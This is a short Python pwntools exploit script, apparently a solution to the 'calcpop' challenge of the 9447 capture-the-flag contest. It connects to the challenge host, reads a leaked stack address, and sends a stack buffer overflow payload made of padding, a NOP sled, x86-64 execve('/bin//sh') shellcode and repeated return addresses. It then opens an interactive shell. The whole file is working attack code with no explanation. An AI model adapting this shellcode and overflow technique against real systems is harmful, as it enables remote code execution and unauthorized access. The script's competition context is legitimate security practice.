#!/usr/bin/env python

from pwn import *
import struct

def p(x):
    return struct.pack('<L', x)

r = remote('calcpop-4gh07blg.9447.plumbing', 9447)
print r.recvline().strip()
r.sendline('hi')
resp = r.recvline().strip()
print resp
RET = p(int(resp.split(' ')[-1], 16))

EGG = "\x48\x31\xd2" + \
      "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
      "\x48\xc1\xeb\x08" + \
      "\x53" + \
      "\x48\x89\xe7" + \
      "\x50" + \
      "\x57" + \
      "\x48\x89\xe6" + \
      "\xb0\x3b" + \
      "\x0f\x05"

PAYLOAD = ''
PAYLOAD += 'A' * 156
PAYLOAD += '\x90' * 200
PAYLOAD += EGG
PAYLOAD += RET * 40

print '[i] PAYLOAD: %r' % PAYLOAD

r.sendline(PAYLOAD)

r.interactive()
